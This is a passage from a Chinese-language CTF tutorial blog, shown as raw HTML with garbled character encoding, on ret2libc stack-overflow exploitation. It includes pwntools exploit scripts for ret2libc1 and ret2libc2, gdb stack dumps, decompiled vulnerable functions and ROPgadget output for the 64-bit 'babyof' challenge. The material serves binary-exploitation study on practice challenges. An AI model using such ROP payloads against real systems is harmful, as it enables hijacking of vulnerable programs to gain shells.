0xffffd4a4 â—‚â€” 0x70 /* <span class="string">&#x27;p&#x27;</span> */</span><br><span class="line">22:0088â”‚ ebp 0xffffd4a8 â€”â–¸ 0xf7ffd020 (_rtld_global) â€”â–¸ 0xf7ffda40 â—‚â€” 0x0</span><br></pre></td></tr></table></figure><p>â€‹ç„¶åæ ¹æ®åƒåœ¾æ•°æ®å¡«å…¥çš„ä½ç½®ï¼ˆè¿™é‡Œæ˜¯ eax çš„åœ°å€ï¼‰åˆ° ebp çš„ä½ç½®ä¹‹é—´çš„é•¿åº¦ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffd4a8</span> - <span class="number">0xffffd43c</span></span><br></pre></td></tr></table></figure><p>â€‹è®¡ç®—å‡ºæ¥çš„ç»“æœä¸º 108ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œéœ€è¦å¡«å…¥çš„åƒåœ¾æ•°æ®çš„é•¿åº¦ä¸º 112 å­—èŠ‚ã€‚</p><p>â€‹å¥½äº†ï¼Œå†ä¹‹åçš„è„šæœ¬ç¼–å†™å°±å¾ˆæ¸…æ™°äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">bin_sh = 0x08048720</span><br><span class="line">system_plt = 0x08048460</span><br><span class="line">payload = b&#x27;a&#x27;*112 + p32(system_plt) + b&#x27;b&#x27;*4 + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="2æƒ…å†µ2"><a class="markdownIt-Anchor" href="#2æƒ…å†µ2">#</a> 2. æƒ…å†µ 2ï¼š</h3><h4 id="é¢˜ç›®æ¡ˆä¾‹ctf-wikiret2libc2"><a class="markdownIt-Anchor" href="#é¢˜ç›®æ¡ˆä¾‹ctf-wikiret2libc2">#</a> é¢˜ç›®æ¡ˆä¾‹ï¼šCTF-Wikiâ€“ret2libc2ï¼š</h4><p>â€‹ç…§ç†æ¥è¯´ï¼Œè¿™ä¸€é“é¢˜ä¸ä¸Šä¸€é“é¢˜ç›¸æ¯”ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¤ªå¤§çš„åŒºåˆ«ï¼Œå·®åˆ«çŸ¥è¯†æŸ¥çœ‹å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œä¼šå‘ç°æŸ¥æ‰¾ä¸åˆ° &quot;/bin/sh&quot; è¿™ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶ä»–çš„è·Ÿä¸Šä¸€é“é¢˜å‡ ä¹ä¸€æ ·ã€‚</p><p>â€‹é‚£ä¹ˆï¼Œé¦–å…ˆ checksec ä¸€ä¸‹ï¼Œä¸ºäº†åç»­çš„æ–¹ä¾¿ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨ python äº¤äº’å¼æ¥è·å–ä¸€äº›ä¿¡æ¯ï¼Œç”¨çš„æ˜¯ ELF () æ–¹æ³•ï¼Œæ¥è·å–ä¸€éƒ¨åˆ†ä¿¡æ¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/mnt/shared]</span><br><span class="line">â””â”€<span class="comment"># python   </span></span><br><span class="line">Python <span class="number">3.11</span><span class="number">.8</span> (main, Feb  <span class="number">7</span> <span class="number">2024</span>, <span class="number">21</span>:<span class="number">52</span>:08) [GCC <span class="number">13.2</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªé¢˜æ˜¯ä¸ªå¼€å¯äº† NX çš„ 32 ä½å°ç«¯åºçš„ç¨‹åºï¼Œé‚£ä¹ˆï¼Œæ‹–åˆ° IDA é‡Œé¢é™æ€åˆ†æä¸€ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å±é™©å‡½æ•°å¾ˆæ˜æ˜¾ï¼Œç›´æ¥å°±æ˜¯ gets ()ï¼Œç„¶åå°±å¯ä»¥é€šè¿‡è¿™ä¸€ç‚¹æ¥è¿›è¡Œæ ˆæº¢å‡ºï¼Œæ£€æŸ¥ä¸‹å…¶ä»–å‡½æ•°ï¼Œå‘ç°ä¸€ä¸ª secure å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;no_shell_QQ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜æ˜¾ï¼Œè¿™é“é¢˜è·Ÿä¸Šä¸€é“é¢˜æ˜¯å·®ä¸å¤šçš„ï¼Œéƒ½åœ¨ secure å‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ª system å‡½æ•°ï¼Œä½†æ˜¯å‚æ•°å´ä¸æ­£ç¡®ï¼Œé‚£ä¹ˆï¼Œä¹‹å‰è¯´è¿‡ï¼Œç¨‹åºä¸­ä¸å­˜åœ¨ &quot;/bin/sh&quot;ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œåº”è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿé‚£å°±æ˜¯è‡ªå·±æ‰‹åŠ¨å†™ä¸€ä¸ªè¿›å»ï¼šé€šè¿‡æ ˆæº¢å‡ºï¼Œæ„é€  ROPï¼Œæ¥è°ƒç”¨ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ª getsï¼Œå¦ä¸€ä¸ªæ˜¯ systemï¼Œå› ä¸ºè¿™ä¿©å‡½æ•°éƒ½å·²ç»åœ¨ç¨‹åºä¸­å†™äº†ï¼Œæ‰€ä»¥ï¼Œå°±æä¾›äº†è¿™ä¸¤ä¸ªå‡½æ•°ç›¸å…³çš„ plt è¡¨ï¼Œé‚£ä¹ˆï¼Œæ—¢ç„¶æ ˆçš„åœ°å€éšæœºåŒ–äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸çŸ¥é“æ ˆçš„åŸºåœ°å€æ˜¯å¤šå°‘ï¼Œæ‰€ä»¥ï¼Œæƒ³å¾€æ ˆä¸Šå†™å…¥ &quot;/bin/sh&quot; çš„å¯èƒ½æ€§å°±å¾ˆä½ï¼Œå‡ ä¹æ²¡æœ‰ï¼Œå› æ­¤å°±è¦è€ƒè™‘å…¶ä»–åœ°æ–¹ï¼Œç»è¿‡æŸ¥æ‰¾ï¼Œå‘ç°ï¼šbss æ®µå­˜åœ¨ä¸€ä¸ªå˜é‡ï¼šbuf2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br></pre></td></tr></table></figure><p>â€‹é‚£ä¹ˆï¼Œå°±å¯ä»¥å¾ˆæ¸…æ¥šçš„çŸ¥é“ &quot;/bin/sh&quot; åº”è¯¥å†™å…¥çš„åœ°å€åœ¨å“ªé‡Œäº†ï¼Œé‚£å°±æ˜¯ bss æ®µã€‚</p><p>â€‹çŸ¥é“äº† buf2 çš„åœ°å€ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ° gets å’Œ system å‡½æ•°çš„åœ°å€ï¼Œä»¥åŠéœ€è¦å¡«å…¥çš„åƒåœ¾æ•°æ®çš„é•¿åº¦ï¼Œé¦–å…ˆé€šè¿‡ python è·å–ä¸¤ä¸ªå‡½æ•°çš„ plt è¡¨çš„åœ°å€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.plt[<span class="string">&quot;system&quot;</span>])</span><br><span class="line"><span class="string">&#x27;0x8048490&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.plt[<span class="string">&quot;gets&quot;</span>])</span><br><span class="line"><span class="string">&#x27;0x8048460&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å gdb åŠ¨æ€è°ƒè¯•è·å–éœ€è¦çš„åƒåœ¾æ•°æ®çš„é•¿åº¦ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 40</span><br><span class="line">00:0000â”‚ esp 0xffffd300 â€”â–¸ 0xffffd31c â—‚â€” <span class="string">&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">01:0004â”‚-084 0xffffd304 â—‚â€” 0x0</span><br><span class="line">02:0008â”‚-080 0xffffd308 â—‚â€” 0x1</span><br><span class="line">03:000câ”‚-07c 0xffffd30c â—‚â€” 0x0</span><br><span class="line">04:0010â”‚-078 0xffffd310 â€”â–¸ 0xf7ffdb9c â€”â–¸ 0xf7fc26f0 â€”â–¸ 0xf7ffda30 â—‚â€” 0x0</span><br><span class="line">05:0014â”‚-074 0xffffd314 â—‚â€” 0x1</span><br><span class="line">06:0018â”‚-070 0xffffd318 â€”â–¸ 0xf7fc2720 â€”â–¸ 0x8048354 â—‚â€” inc edi /* <span class="string">&#x27;GLIBC_2.0&#x27;</span> */</span><br><span class="line">07:001câ”‚ eax 0xffffd31c â—‚â€” <span class="string">&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">08:0020â”‚-068 0xffffd320 â—‚â€” <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">09:0024â”‚-064 0xffffd324 â—‚â€” 0x0</span><br><span class="line">0a:0028â”‚-060 0xffffd328 â€”â–¸ 0xf7ffda30 â—‚â€” 0x0</span><br><span class="line">0b:002câ”‚-05c 0xffffd32c â—‚â€” 0x1c</span><br><span class="line">0c:0030â”‚-058 0xffffd330 â—‚â€” 0xffffffff</span><br><span class="line">0d:0034â”‚-054 0xffffd334 â€”â–¸ 0xf7fca67c â—‚â€” 0xe</span><br><span class="line">0e:0038â”‚-050 0xffffd338 â€”â–¸ 0xf7ffd5e8 (_rtld_global+1512) â€”â–¸ 0xf7fca000 â—‚â€” 0x464c457f</span><br><span class="line">0f:003câ”‚-04c 0xffffd33c â€”â–¸ 0xffffdfe2 â—‚â€” <span class="string">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class="line">10:0040â”‚-048 0xffffd340 â€”â–¸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x32f34</span><br><span class="line">11:0044â”‚-044 0xffffd344 â—‚â€” 0xc /* <span class="string">&#x27;\x0c&#x27;</span> */</span><br><span class="line">12:0048â”‚-040 0xffffd348 â—‚â€” 0x0</span><br><span class="line">... â†“        3 skipped</span><br><span class="line">16:0058â”‚-030 0xffffd358 â—‚â€” 0x13</span><br><span class="line">17:005câ”‚-02c 0xffffd35c â€”â–¸ 0xf7fc2400 â€”â–¸ 0xf7c00000 â—‚â€” 0x464c457f</span><br><span class="line">18:0060â”‚-028 0xffffd360 â€”â–¸ 0xf7c216ac â—‚â€” 0x21e04c</span><br><span class="line">19:0064â”‚-024 0xffffd364 â€”â–¸ 0xf7fd9d41 (_dl_fixup+225) â—‚â€” mov dword ptr [esp + 0x28], eax                                                                  </span><br><span class="line">1a:0068â”‚-020 0xffffd368 â€”â–¸ 0xf7c1c9a2 â—‚â€” <span class="string">&#x27;_dl_audit_preinit&#x27;</span></span><br><span class="line">1b:006câ”‚-01c 0xffffd36c â€”â–¸ 0xf7fc2400 â€”â–¸ 0xf7c00000 â—‚â€” 0x464c457f</span><br><span class="line">1c:0070â”‚-018 0xffffd370 â€”â–¸ 0xffffd3a0 â€”â–¸ 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x21dd8c</span><br><span class="line">1d:0074â”‚-014 0xffffd374 â€”â–¸ 0xf7fc25d8 â€”â–¸ 0xf7ffdb9c â€”â–¸ 0xf7fc26f0 â€”â–¸ 0xf7ffda30 â—‚â€” ...                                                                    </span><br><span class="line">1e:0078â”‚-010 0xffffd378 â€”â–¸ 0xf7fc2ab0 â€”â–¸ 0xf7c1f22d â—‚â€” <span class="string">&#x27;GLIBC_PRIVATE&#x27;</span></span><br><span class="line">1f:007câ”‚-00c 0xffffd37c â—‚â€” 0x1</span><br><span class="line">20:0080â”‚-008 0xffffd380 â—‚â€” 0x1</span><br><span class="line">21:0084â”‚-004 0xffffd384 â—‚â€” 0x0</span><br><span class="line">22:0088â”‚ ebp 0xffffd388 â—‚â€” 0x0</span><br><span class="line">23:008câ”‚+004 0xffffd38c â€”â–¸ 0xf7c237c5 (__libc_start_call_main+117) â—‚â€” add esp, 0x10                                                                       </span><br><span class="line">24:0090â”‚+008 0xffffd390 â—‚â€” 0x1</span><br><span class="line">25:0094â”‚+00c 0xffffd394 â€”â–¸ 0xffffd444 â€”â–¸ 0xffffd5c2 â—‚â€” <span class="string">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class="line">26:0098â”‚+010 0xffffd398 â€”â–¸ 0xffffd44c â€”â–¸ 0xffffd5d8 â—‚â€” <span class="string">&#x27;COLORTERM=truecolor&#x27;</span></span><br><span class="line">27:009câ”‚+014 0xffffd39c â€”â–¸ 0xffffd3b0 â€”â–¸ 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x21dd8c</span><br><span class="line">pwndbg&gt; 0x388 -0x31c</span><br><span class="line">Undefined <span class="built_in">command</span>: <span class="string">&quot;0x388&quot;</span>.  Try <span class="string">&quot;help&quot;</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> 0x388 -0x31c</span><br><span class="line"><span class="variable">$1</span> = 108</span><br></pre></td></tr></table></figure><p>â€‹åŸºæœ¬ä¸Šéœ€è¦çš„ä¿¡æ¯å…¨éƒ¨éƒ½æœ‰äº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œä»£ç çš„ç¼–å†™äº†ï¼ŒåŸºæœ¬ä¸Šæ€è·¯æŒ‰ç…§ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/aa290048a01543e7bcb197d704071cd2.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™é‡Œçš„æ€è·¯æ˜¯æ— è®ºåç»­çš„ç¨‹åºæ˜¯å¦å´©æºƒï¼Œéƒ½è·Ÿæˆ‘ä»¬æ²¡å…³ç³»ï¼Œæ‰€ä»¥æ²¡æœ‰å¹³è¡¡æ ˆï¼Œå¹³è¡¡æ ˆçš„å†™æ³•å¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/cb466c0487d04ffeae39492abda43194.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å› æ­¤ï¼Œæœ€åçš„ exp ä¸ºï¼ˆæ²¡æœ‰å¹³è¡¡æ ˆï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x8048460</span><br><span class="line">sys_plt = 0x8048490</span><br><span class="line">buf2 = 0x0804A080</span><br><span class="line">payload = b&#x27;A&#x27;*112 + p32(gets_plt) + p32(sys_plt) + p32(buf2) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="3æƒ…å†µ3"><a class="markdownIt-Anchor" href="#3æƒ…å†µ3">#</a> 3. æƒ…å†µ 3ï¼š</h3><h4 id="é¢˜ç›®æ¡ˆä¾‹2021-é¹¤åŸæ¯babyof"><a class="markdownIt-Anchor" href="#é¢˜ç›®æ¡ˆä¾‹2021-é¹¤åŸæ¯babyof">#</a> é¢˜ç›®æ¡ˆä¾‹ï¼š[2021 é¹¤åŸæ¯] babyofï¼š</h4><p>â€‹åœ¨åšå­¦ä¹  CTF-Wikiâ€“ret2libc3 çš„æ—¶å€™å¯æˆ‘å‘ç°äº†ä¸€ç³»åˆ—çš„é—®é¢˜ï¼Œå°±æ¯”å¦‚è¯´ LibcSearcher æŸ¥æ‰¾æœ¬åœ°è¿è¡Œçš„ç¨‹åºçš„ libc ç‰ˆæœ¬æ€»æ˜¯å‡ºç°æŸ¥æ‰¾çš„ 10 ä¸ªç‰ˆæœ¬å…¨éƒ¨ä¸åŒ¹é…ä¹‹ç±»çš„æƒ…å†µï¼Œå¾ˆè®©äººå¤´ç–¼ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„è§£å†³æ–¹æ³•ï¼Œæœ‰ç‚¹å‡­è¿æ°”ï¼Œ<strong>è¿™ä¸ªé—®é¢˜å…ˆè®°å½•åœ¨è¿™é‡Œ</strong>ï¼Œç­‰åˆ°ä»¥åæœ‰æœºä¼šäº†å†é‡æ–°ç¼–å†™è¿™ä¸ªé—®é¢˜ã€‚</p><p>â€‹åˆå› ä¸ºä¹‹å‰éƒ½æ˜¯åšçš„å…³äº 32 ä½ç¨‹åºçš„ ret2libcï¼Œæ‰€ä»¥è¿™é‡Œåˆå› ä¸ºåˆšå¥½ç¢°åˆ°äº†æœ¬åœ°è¿è¡Œçš„ç¨‹åºçš„ libc ç‰ˆæœ¬æ‰¾ä¸åˆ°çš„æƒ…å†µï¼Œå› æ­¤è¿™é‡Œå°±æ¢ä¸€ä¸ª 64 çš„ç¨‹åºæ¥åšã€‚</p><p>â€‹é¦–å…ˆï¼Œè®²ä¸€ä¸‹å‰ç½®çš„çŸ¥è¯†ï¼Œå…³äº 64 ä½ç¨‹åºçš„å‡½æ•°çš„ä¼ å‚æ–¹å¼è¿˜æœ‰å…¶ä»–çš„ä¸€äº›å‰ç½®å†…å®¹ã€‚</p><p>â€‹64 ä½ç¨‹åºä¸ 32 ä½ç¨‹åºçš„å‡½æ•°ä¼ å‚æ–¹å¼æ˜¯åä¸€å®šçš„åŒºåˆ«çš„ï¼Œ32 ä½ç¨‹åºçš„ä¼ å‚åªç”¨åˆ°äº†æ ˆï¼Œè€Œ 64 ä½çš„ç¨‹åºçš„ä¼ å‚å‰å…­ä¸ªå‚æ•°åˆ†åˆ«ç”¨åˆ°äº† rdiï¼Œrsiï¼Œrdxï¼Œrcxï¼Œr8ï¼Œr9 è¿™å…­ä¸ªå¯„å­˜å™¨ï¼Œä¹‹åæ‰ä¼šç”¨åˆ°æ ˆã€‚</p><p>â€‹å¦å¤–ï¼Œå¯¹äº libc çš„è½½å…¥å†…å­˜ï¼ŒåŠ¨æ€é“¾æ¥åº“è½½å…¥åˆ°å†…å­˜ä¸­çš„èµ·å§‹åœ°å€æ˜¯éƒ¨åˆ†éšæœºçš„ï¼Œä¸è¿‡å› ä¸ºå†…å­˜åˆ†é¡µçš„æ¦‚å¿µï¼Œä¼šå‘ç°æ¯ä¸€æ¬¡è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼Œlibc çš„æŸä¸€ä¸ªå‡½æ•°çš„åœ°å€çš„åä¸‰ä½æ˜¯ä¸å˜çš„ï¼Œä¹Ÿæ­£å› ä¸º libc è½½å…¥å†…å­˜çš„èµ·å§‹åœ°å€æ˜¯éšæœºåœ¨åˆ†é¡µçš„èµ·å§‹åœ°å€ï¼Œæ‰€ä»¥ä¼šå‘ç°æ¯ä¸€æ¬¡è¿è¡Œç¨‹åºæ³„éœ²åˆ°çš„å‡½æ•°åœ°å€çš„åä¸‰ä½æ˜¯ç›¸åŒçš„ï¼Œå› æ­¤ï¼ŒLibcSearcher æ¨¡å—ä»¥åŠå…¶ä»–çš„ç›¸å¯¹åº”çš„ç½‘ç«™å·¥å…·æ‰èƒ½è·å¾—æ­£ç¡®çš„ libc çš„ç‰ˆæœ¬ã€‚</p><p>â€‹å¥½çš„ï¼Œå‰ç½®çš„çŸ¥è¯†å·®ä¸å¤šå°±è¿™äº›äº†ï¼Œä¹‹åé‡åˆ°äº†å†è¯´ï¼Œé¦–å…ˆæ‰“å¼€é¢˜ç›®ï¼Œç¬¬ä¸€æ—¶é—´çœ‹çœ‹ä¿æŠ¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="comment"># checksec babyof</span></span><br><span class="line">[*] <span class="string">&#x27;/mnt/shared/babyof&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>â€‹å¯è§ï¼Œæ˜¯ 64 ä¸ºå°ç«¯åºï¼Œå¼€å¯äº† NX ä¿æŠ¤ï¼Œä¹‹åé™æ€è°ƒè¯•çœ‹çœ‹ï¼Œé¦–å…ˆæ˜¯ mainï¼Œå·¦è¾¹èƒ½æ‰¾åˆ°ï¼Œå‘ç° main é‡Œé¢è°ƒç”¨äº†ä¸ªå‡½æ•°ï¼Œæ˜¯ä»¥åœ°å€çš„å½¢å¼ï¼Œè·Ÿè¿›è¿™ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400632</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know how to do buffer overflow?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;I hope you win&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆä¸é”™ï¼Œå¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªå°±æ˜¯æ¼æ´å‡½æ•°ï¼Œé‚£ä¹ˆï¼Œå…ˆç”¨ cyclic ç®—ä¸€ä¸‹åç§»é‡ï¼Œå¾—åˆ°çš„æ˜¯ 72ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/b60c8d0628ed44e2bda0cff18649dcf3.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹‹åï¼Œè¿˜éœ€è¦ ret å’Œ pop rdi;ret çš„ gadgetsï¼Œæ‰€ä»¥ç”¨ ROPgadget æ¥æŸ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="comment"># ROPgadget --binary babyof --only &quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040073c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040073e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400740 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400742 : pop r15 ; ret</span><br><span class="line">0x000000000040073b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040073f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400619 : pop rbp ; ret</span><br><span class="line">0x0000000000400743 : pop rdi ; ret</span><br><span class="line">0x0000000000400741 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040073d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400506 : ret</span><br><span class="line">0x0000000000400870 : ret 